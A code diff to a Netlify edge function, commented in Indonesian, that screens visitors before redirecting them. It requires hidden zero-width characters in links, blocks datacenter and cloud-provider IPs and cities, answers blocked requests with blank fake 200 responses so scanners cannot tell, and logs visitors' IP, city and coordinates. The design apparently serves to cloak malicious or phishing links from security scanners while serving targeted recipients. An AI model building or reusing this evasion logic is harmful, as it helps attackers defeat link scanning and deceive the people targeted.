@@ -5,7 +5,6 @@ export default async function handler(req: Request, context: Context): Promise<R
     const ua = req.headers.get("user-agent") || "Unknown";
     const uaLower = ua.toLowerCase();
 
-    // ✅ Netlify pakai x-nf-client-connection-ip untuk IP asli
     const ip = req.headers.get("x-nf-client-connection-ip")
       || req.headers.get("x-real-ip")
       || req.headers.get("x-forwarded-for")?.split(",")[0]?.trim()
@@ -15,22 +14,84 @@ export default async function handler(req: Request, context: Context): Promise<R
     const geo = context.geo;
     const country = geo?.country?.code || "Unknown";
     const city = geo?.city || "Unknown";
+    const latitude = geo?.latitude || "Unknown";
+    const longitude = geo?.longitude || "Unknown";
 
     // ═══════════════════════════════════════════
-    // ═══ NETLIFY GEO + ASN DETECTION ════════════
+    // ═══ NETLIFY NATIVE DETECTION ═══════════════
     // ═══════════════════════════════════════════
 
-    // Blokir negara tertentu jika perlu (opsional, uncomment jika mau)
+    // --- 1. Netlify Bot Header Detection ---
+    // Netlify secara native menandai beberapa request bot
+    const netlifyBotHeader = req.headers.get("x-nf-bot-management");
+    const netlifyClientInfo = req.headers.get("x-nf-client-info");
+    const netlifyRequestId = req.headers.get("x-nf-request-id");
+    const netlifyVisitorId = req.headers.get("x-nf-visitor-id");
+
+    if (netlifyBotHeader) {
+      try {
+        const botData = JSON.parse(netlifyBotHeader);
+        // Jika Netlify mendeteksi sebagai bot
+        if (botData?.score !== undefined && botData.score < 50) {
+          console.log(`❌ BLOCKED BOT (NETLIFY NATIVE): IP=${ip} | SCORE=${botData.score} | UA=${ua}`);
+          return new Response("", { status: 200 });
+        }
+      } catch (_) {}
+    }
+
+    // --- 2. Geo-based Datacenter Detection ---
+    // Ashburn (Virginia) = datacenter hub terbesar, sering scanner
+    const datacenterCities = [
+      "ashburn", "boydton", "des moines", "council bluffs",
+      "the dalles", "lenoir", "moncks corner", "pryor creek",
+      "jakarta pusat", // AWS Jakarta datacenter
+      "singapore", "hong kong", "tokyo", "seoul",
+      "amsterdam", "frankfurt", "london", "paris",
+      "sydney", "melbourne", "toronto", "montreal",
+      "san jose", "santa clara", "seattle", "portland",
+    ];
+
+    const cityLower = city.toLowerCase();
+    const isDatacenterCity = datacenterCities.some(dc => cityLower.includes(dc));
+
+    // Hanya blokir Ashburn/datacenter JIKA tidak ada ZWC (scanner otomatis)
+    // Akan dicek lebih lanjut di bagian ZWC
+
+    // --- 3. Blokir negara berisiko tinggi spam (opsional) ---
     // const blockedCountries = ["CN", "RU", "KP", "IR"];
     // if (blockedCountries.includes(country)) {
     //   console.log(`❌ BLOCKED (COUNTRY): IP=${ip} | COUNTRY=${country}`);
-    //   return new Response("Error 403: Access Denied", { status: 403 });
+    //   return new Response("", { status: 200 });
     // }
 
-    console.log(`🌍 GEO INFO: IP=${ip} | COUNTRY=${country} | CITY=${city}`);
+    // --- 4. ASN Datacenter Detection via IP range ---
+    const datacenterIPRanges = [
+      // AWS
+      "52.", "54.", "18.", "35.", "34.",
+      // Google Cloud
+      "104.196.", "104.197.", "104.198.", "104.199.",
+      "35.186.", "35.187.", "35.188.", "35.189.",
+      // Azure
+      "40.74.", "40.75.", "40.76.", "40.77.", "40.78.",
+      "40.79.", "40.80.", "52.224.", "52.225.", "52.226.",
+      // DigitalOcean
+      "167.99.", "167.172.", "178.62.", "188.166.",
+      // Linode/Akamai
+      "139.144.", "172.232.", "172.233.", "172.234.",
+      // Hetzner
+      "95.217.", "116.202.", "116.203.", "135.181.",
+      // OVH
+      "51.75.", "51.77.", "51.79.", "51.89.", "51.91.",
+      // Vultr
+      "45.32.", "45.63.", "45.76.", "45.77.",
+    ];
+
+    const isDatacenterIP = datacenterIPRanges.some(range => ip.startsWith(range));
+
+    console.log(`🌍 GEO INFO: IP=${ip} | COUNTRY=${country} | CITY=${city} | LAT=${latitude} | LON=${longitude} | DATACENTER=${isDatacenterCity || isDatacenterIP}`);
 
     // ═══════════════════════════════════════════
-    // ═══ STATIC FILES ══════════════════���════════
+    // ═══ STATIC FILES ═══════════════════════════
     // ═══════════════════════════════════════════
     if (/favicon|manifest|\.ico|\.png|robots\.txt/.test(url.pathname)) {
       console.log(`❌ BLOCKED BOT (STATIC): IP=${ip} | UA=${ua}`);
@@ -49,23 +110,35 @@ export default async function handler(req: Request, context: Context): Promise<R
         const elapsed = now - parseInt(ts);
         if (elapsed < 2000) {
           console.log(`❌ BLOCKED BOT (TOO FAST): IP=${ip} | UA=${ua} | TIME=${elapsed}ms`);
-          return new Response("Error 403: Access Denied", { status: 403 });
+          return new Response("", { status: 200 });
         }
-        console.log(`🚀 HUMAN VERIFIED: IP=${ip} | TIME=${elapsed}ms | UA=${ua}`);
+        console.log(`🚀 HUMAN VERIFIED: IP=${ip} | TIME=${elapsed}ms | UA=${ua} | COUNTRY=${country}`);
         return Response.redirect("https://debounce.com", 302);
       }
 
       console.log(`❌ BLOCKED BOT (NO TOKEN): IP=${ip} | UA=${ua}`);
-      return new Response("Error 403: Access Denied", { status: 403 });
+      return new Response("", { status: 200 });
     }
 
     // ═══════════════════════════════════════════
     // ═══ ZWC CHECK ══════════════════════════════
     // ═══════════════════════════════════════════
     const hasZwc = /[\u200B-\u200D\uFEFF]/.test(decodeURIComponent(url.pathname));
+
     if (!hasZwc) {
+      // Jika dari datacenter DAN tidak ada ZWC = pasti scanner
+      if (isDatacenterCity || isDatacenterIP) {
+        console.log(`❌ BLOCKED BOT (DATACENTER+NO ZWC): IP=${ip} | CITY=${city} | UA=${ua}`);
+        return new Response("", { status: 200 });
+      }
       console.log(`⚠️ NO ZWC (COPIED LINK): IP=${ip} | UA=${ua}`);
       return new Response("404 Not Found", { status: 404 });
+    }
+
+    // Jika ada ZWC tapi dari datacenter = bot canggih
+    if (isDatacenterCity || isDatacenterIP) {
+      console.log(`❌ BLOCKED BOT (DATACENTER+ZWC): IP=${ip} | CITY=${city} | UA=${ua}`);
+      return new Response("", { status: 200 });
     }
 
     // ═══════════════════════════════════════════
@@ -120,7 +193,7 @@ export default async function handler(req: Request, context: Context): Promise<R
 
     if (matchedUA) {
       console.log(`❌ BLOCKED BOT (UA): IP=${ip} | UA=${ua} | MATCH=${matchedUA}`);
-      return new Response("", { status: 200 }); // Fake 200 agar scanner tidak tahu
+      return new Response("", { status: 200 });
     }
     if (matchedHeader) {
       console.log(`❌ BLOCKED BOT (HEADER): IP=${ip} | UA=${ua} | HEADER=${matchedHeader}`);
@@ -159,13 +232,13 @@ export default async function handler(req: Request, context: Context): Promise<R
       if (!isMobile && !isDesktop) reasons.push("NO_PLATFORM");
       if (isBehaviorBot) reasons.push(`BEHAVIOR=${behaviorScore}`);
       console.log(`❌ BLOCKED BOT (FINGERPRINT): IP=${ip} | UA=${ua} | REASON=${reasons.join(",")}`);
-      return new Response("", { status: 200 }); // Fake 200
+      return new Response("", { status: 200 });
     }
 
     // ═══════════════════════════════════════════
     // ═══ JS CHALLENGE PAGE ══════════════════════
     // ═══════════════════════════════════════════
-    console.log(`⏳ JS CHALLENGE SERVED: IP=${ip} | COUNTRY=${country} | UA=${ua}`);
+    console.log(`⏳ JS CHALLENGE SERVED: IP=${ip} | COUNTRY=${country} | CITY=${city} | UA=${ua}`);
 
     const ts = Date.now();
     const challengeHTML = `<!DOCTYPE html>
